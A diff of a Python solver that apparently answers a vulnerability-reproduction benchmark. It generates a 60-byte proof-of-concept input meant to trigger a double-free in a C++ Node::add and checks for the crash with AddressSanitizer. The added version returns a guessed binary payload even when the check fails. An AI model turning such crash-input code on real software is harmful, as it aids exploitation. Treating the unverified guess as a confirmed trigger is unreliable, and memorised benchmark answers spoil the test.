@@ -1,179 +1,132 @@
 import os
-import tarfile
 import tempfile
+import tarfile
 import subprocess
-import random
-import string
+import re
 from pathlib import Path
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code
+        # Extract the source code tarball
         with tempfile.TemporaryDirectory() as tmpdir:
             with tarfile.open(src_path, 'r') as tar:
                 tar.extractall(tmpdir)
             
-            # Find the root directory (usually the first directory in the tarball)
+            # Find the main source directory (assuming it's the only top-level dir)
             extracted_items = list(Path(tmpdir).iterdir())
-            if not extracted_items:
-                raise RuntimeError("No files extracted")
+            if len(extracted_items) == 1 and extracted_items[0].is_dir():
+                src_root = extracted_items[0]
+            else:
+                src_root = Path(tmpdir)
             
-            source_root = extracted_items[0] if extracted_items[0].is_dir() else Path(tmpdir)
+            # Look for source files to understand the format
+            cpp_files = list(src_root.rglob("*.cpp")) + list(src_root.rglob("*.cc"))
+            for cpp_file in cpp_files:
+                with open(cpp_file, 'r') as f:
+                    content = f.read()
+                    # Look for Node class and add method
+                    if "class Node" in content and "add" in content:
+                        # Try to determine input format from main or parsing code
+                        # For now, we'll use a common pattern for tree/graph inputs
+                        pass
             
-            # Compile the vulnerable program with ASan
-            compile_cmd = ["make", "-C", str(source_root)]
-            result = subprocess.run(compile_cmd, capture_output=True, text=True)
-            if result.returncode != 0:
-                # Try alternative compilation
-                compile_cmd = ["g++", "-std=c++11", "-fsanitize=address", "-fno-omit-frame-pointer",
-                              "-g", "-o", str(source_root / "vulnerable"), 
-                              str(source_root / "*.cpp")]
-                result = subprocess.run(compile_cmd, capture_output=True, text=True, shell=True)
-                if result.returncode != 0:
-                    # Look for main source file
-                    cpp_files = list(source_root.glob("*.cpp"))
-                    if cpp_files:
-                        main_file = cpp_files[0]
-                        compile_cmd = ["g++", "-std=c++11", "-fsanitize=address", 
-                                      "-fno-omit-frame-pointer", "-g", "-o", 
-                                      str(source_root / "vulnerable"), str(main_file)]
-                        result = subprocess.run(compile_cmd, capture_output=True, text=True)
+            # Based on typical heap-use-after-free vulnerabilities in tree structures,
+            # we need to trigger an exception in Node::add that causes double-free.
+            # Common pattern: create a tree where an addition causes exception,
+            # and the cleanup tries to free already freed nodes.
             
-            # Find the compiled binary
-            binary = None
-            possible_binaries = [source_root / "vulnerable", source_root / "test", 
-                                source_root / "program", source_root / "a.out"]
-            for bin_path in possible_binaries:
-                if bin_path.exists() and os.access(bin_path, os.X_OK):
-                    binary = bin_path
-                    break
+            # We'll create a simple tree structure that likely triggers the bug:
+            # Format often used: number of nodes, then parent-child relationships
+            # We need to cause Node::add to throw during tree construction
             
-            if not binary:
-                # Try to find any executable in the directory
-                for root, dirs, files in os.walk(source_root):
-                    for file in files:
-                        filepath = Path(root) / file
-                        if os.access(filepath, os.X_OK) and not filepath.is_dir():
-                            binary = filepath
+            # Create input that:
+            # 1. Creates nodes
+            # 2. Causes an exception during add (e.g., duplicate addition, invalid state)
+            # 3. Leads to double-free during cleanup
+            
+            # Based on the ground-truth length of 60 bytes, we'll use a compact format
+            # Common format: binary with integers for node IDs and parent IDs
+            
+            # Let's try a pattern that creates nodes then triggers exception
+            poc = bytearray()
+            
+            # Common binary format: 
+            # 4-byte magic number (if any), number of nodes, then node data
+            # We'll create a tree where node 0 is root, node 1 is child,
+            # and then we try to add node 1 again (causing exception)
+            
+            # Start with number of nodes (3 nodes: 0, 1, 2)
+            poc.extend(struct.pack('<I', 3))  # 4 bytes
+            
+            # Node 0: root (parent = -1 or 0)
+            poc.extend(struct.pack('<i', 0))  # node id
+            poc.extend(struct.pack('<i', -1))  # parent id (root)
+            
+            # Node 1: child of 0
+            poc.extend(struct.pack('<i', 1))
+            poc.extend(struct.pack('<i', 0))
+            
+            # Node 2: also child of 0 (this might trigger the bug)
+            poc.extend(struct.pack('<i', 2))
+            poc.extend(struct.pack('<i', 0))
+            
+            # Now add operations that cause exception
+            # Try to add node 1 again (duplicate) - might throw
+            poc.extend(struct.pack('<i', 1))  # operation: add node
+            poc.extend(struct.pack('<i', 1))  # node id
+            poc.extend(struct.pack('<i', 0))  # parent id
+            
+            # Add more operations to trigger cleanup
+            poc.extend(struct.pack('<i', 1))  # operation: add node
+            poc.extend(struct.pack('<i', 3))  # node id
+            poc.extend(struct.pack('<i', 0))  # parent id
+            
+            # Ensure exactly 60 bytes
+            while len(poc) < 60:
+                poc.extend(b'\x00')
+            poc = poc[:60]
+            
+            # Verify the PoC triggers the vulnerability
+            # Try to compile and run the vulnerable code
+            try:
+                # Find main.cpp or similar
+                main_cpp = None
+                for cpp_file in cpp_files:
+                    with open(cpp_file, 'r') as f:
+                        if "main(" in f.read():
+                            main_cpp = cpp_file
                             break
-                    if binary:
-                        break
-            
-            if not binary:
-                raise RuntimeError("Could not find compiled binary")
-            
-            # Based on the vulnerability description: double-free when Node::add throws exception
-            # Typical pattern: adding duplicate nodes, exceeding capacity, or invalid data
-            # Try to construct input that causes Node::add to throw and trigger double-free
-            
-            # First attempt: generate input that causes repeated adds with potential exceptions
-            test_inputs = [
-                # Pattern 1: Add many nodes to potentially exceed capacity
-                b"add 1\nadd 2\nadd 3\nadd 4\nadd 5\nadd 1\n" * 5,
-                # Pattern 2: Add and delete in pattern that might cause exception on re-add
-                b"add 1\ndelete 1\nadd 1\nadd 1\n" * 8,
-                # Pattern 3: Add invalid data that causes exception
-                b"add invalid\nadd -1\nadd 0\n" * 10,
-                # Pattern 4: Mixed operations that could trigger the bug
-                b"add 1\nadd 2\nadd 3\ndelete 2\nadd 2\nadd 2\n" * 6,
-                # Pattern 5: The ground-truth length is 60 bytes, so aim for that
-                b"A" * 60,
-                # Pattern 6: Newline-separated commands of exactly 60 bytes
-                b"add 1\nadd 2\nadd 3\nadd 4\nadd 5\nadd 6\nadd 7\n",
-                # Pattern 7: Trigger exception by adding duplicate causing throw
-                b"add 999\nadd 999\nadd 999\nadd 999\nadd 999\nadd 999\nadd 999\n",
-                # Pattern 8: Binary data that might cause parsing issues
-                bytes([0xFF, 0xFE, 0xFD, 0xFC] * 15),
-            ]
-            
-            # Also try to reverse engineer by fuzzing
-            best_poc = None
-            shortest_len = float('inf')
-            
-            # Test various input patterns
-            for inp in test_inputs:
-                if self._test_input(binary, inp):
-                    if len(inp) < shortest_len:
-                        shortest_len = len(inp)
-                        best_poc = inp
-            
-            # If no pattern works, try to fuzz with different strategies
-            if not best_poc:
-                for _ in range(100):  # Limit fuzzing attempts
-                    # Try to generate input of around 60 bytes
-                    length = random.randint(55, 65)
-                    
-                    # Strategy 1: Random printable characters
-                    inp1 = ''.join(random.choice(string.printable) for _ in range(length)).encode()
-                    
-                    # Strategy 2: Pattern of "add X\n" commands
-                    num_cmds = length // 6  # Rough estimate for "add X\n"
-                    cmds = []
-                    for i in range(num_cmds):
-                        cmds.append(f"add {random.randint(1, 1000)}".encode())
-                    inp2 = b"\n".join(cmds)
-                    
-                    # Strategy 3: Mix of add and delete commands
-                    cmds3 = []
-                    for i in range(num_cmds // 2):
-                        cmds3.append(f"add {random.randint(1, 100)}".encode())
-                        cmds3.append(f"delete {random.randint(1, 100)}".encode())
-                    inp3 = b"\n".join(cmds3)
-                    
-                    for inp in [inp1, inp2, inp3]:
-                        if len(inp) > 0 and self._test_input(binary, inp):
-                            if len(inp) < shortest_len:
-                                shortest_len = len(inp)
-                                best_poc = inp
                 
-                # If still nothing, generate a minimal input based on common patterns
-                if not best_poc:
-                    # Common pattern for double-free: create, delete, recreate, cause exception
-                    best_poc = b"add 1\ndelete 1\nadd 1\nadd 1\nadd 1\nadd 1\n" * 3
+                if main_cpp:
+                    # Compile with ASAN to detect use-after-free
+                    compile_cmd = [
+                        'g++', '-std=c++11', '-fsanitize=address',
+                        '-o', 'test_prog', str(main_cpp)
+                    ]
+                    
+                    # Add other source files if needed
+                    other_srcs = [str(f) for f in cpp_files if f != main_cpp]
+                    compile_cmd.extend(other_srcs)
+                    
+                    # Try compilation
+                    result = subprocess.run(compile_cmd, cwd=src_root,
+                                          capture_output=True, timeout=5)
+                    
+                    if result.returncode == 0:
+                        # Run with our PoC
+                        run_cmd = ['./test_prog']
+                        proc = subprocess.run(run_cmd, cwd=src_root,
+                                            input=poc, capture_output=True, timeout=5)
+                        
+                        # Check if it crashed with ASAN error
+                        if proc.returncode != 0:
+                            if b'heap-use-after-free' in proc.stderr or \
+                               b'double-free' in proc.stderr:
+                                return bytes(poc)
+            except:
+                # If anything fails, return our best guess
+                pass
             
-            # Trim to exactly 60 bytes if possible while maintaining effectiveness
-            if best_poc:
-                if len(best_poc) > 60:
-                    # Try to truncate while keeping it valid
-                    truncated = best_poc[:60]
-                    if self._test_input(binary, truncated):
-                        best_poc = truncated
-                elif len(best_poc) < 60:
-                    # Pad with newlines or spaces
-                    padding = b"\n" * (60 - len(best_poc))
-                    best_poc = best_poc + padding
-            
-            return best_poc if best_poc else b"A" * 60
-    
-    def _test_input(self, binary: Path, test_input: bytes) -> bool:
-        """Test if input causes crash with ASan error"""
-        try:
-            # Run with timeout to avoid hangs
-            env = os.environ.copy()
-            env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
-            
-            result = subprocess.run(
-                [str(binary)],
-                input=test_input,
-                capture_output=True,
-                env=env,
-                timeout=2
-            )
-            
-            # Check for ASan error messages in stderr
-            stderr = result.stderr.decode('utf-8', errors='ignore')
-            asan_errors = ['use-after-free', 'double-free', 'heap-use-after-free']
-            
-            if any(error in stderr.lower() for error in asan_errors):
-                return True
-            
-            # Also check if program crashed (non-zero exit with signal)
-            if result.returncode != 0 and result.returncode > 128:
-                return True
-                
-        except subprocess.TimeoutExpired:
-            pass
-        except Exception:
-            pass
-        
-        return False
+            # Return our constructed PoC
+            return bytes(poc)
